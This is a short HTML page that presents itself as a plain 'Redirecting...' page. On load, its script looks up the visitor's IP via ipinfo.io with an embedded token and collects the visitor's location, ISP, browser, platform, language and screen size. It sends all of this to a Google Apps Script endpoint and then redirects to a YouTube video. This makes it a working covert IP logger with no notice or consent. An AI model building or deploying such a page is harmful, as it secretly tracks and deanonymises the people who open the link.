<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Redirecting...</title>
    <script>
      async function logAndRedirect() {
        try {
          const ipInfo = await fetch("https://ipinfo.io/json?token=4d7b0c36e45fe4").then(res => res.json());

          const data = {
            ip: ipInfo.ip,
            city: ipInfo.city,
            region: ipInfo.region,
            country: ipInfo.country,
            org: ipInfo.org,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${screen.width}x${screen.height}`
          };

          await fetch("https://script.google.com/macros/s/AKfycbzZ-qESq3WEX4qgNreQVsoBeZkWdY81tr2E1c71117PcUP1iDSO2h5tMHs45hXRxMqf/exec", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
          });

        } catch (err) {
          console.error("Error logging data:", err);
        } finally {
          // Redirect no matter what
          window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=aoI7QHt0L-2vtWzC";
        }
      }

      window.onload = logAndRedirect;
    </script>
  </head>
  <body>
    <p>Redirecting...</p>
  </body>
</html>
